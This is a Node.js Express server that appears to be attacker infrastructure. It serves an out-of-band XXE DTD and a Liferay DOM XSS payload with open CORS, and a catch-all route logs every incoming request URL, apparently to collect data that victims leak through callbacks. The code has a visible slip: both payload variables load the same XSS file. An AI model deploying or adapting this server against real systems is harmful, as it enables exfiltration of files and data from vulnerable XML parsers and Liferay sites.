// PAYLOADS
const fs = require('fs');
const oobXXE = fs.readFileSync('./payloads/liferayDomXSS.xml').toString('utf-8');
const liferay = fs.readFileSync('./payloads/liferayDomXSS.xml').toString('utf-8');


// SERVER
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000

var arr = [];

app.get('/xxe.dtd', (req, res) => {
	res.header('Access-Control-Allow-Origin', '*');
	res.set('Content-Type', 'text/xml');
	res.send(oobXXE);
});

app.get('/liferay', (req, res) => {
	res.header('Access-Control-Allow-Origin', '*');
	res.set('Content-Type', 'text/xml');
	res.send(liferay);
});

app.get('*', (req, res) => {
	const response = req.protocol + '://' + req.get('host') + req.originalUrl;
	arr.push(response);
	res.send(arr);
});

app.options('*', (req, res, next) => {
	res.header('Access-Control-Allow-Origin', '*');
	res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS');
	res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, Content-Length, X-Requested-With');
	res.send(200);
});

app.listen(PORT, () => console.log('Example app listening for HTTPS on port ' + PORT + '!'))
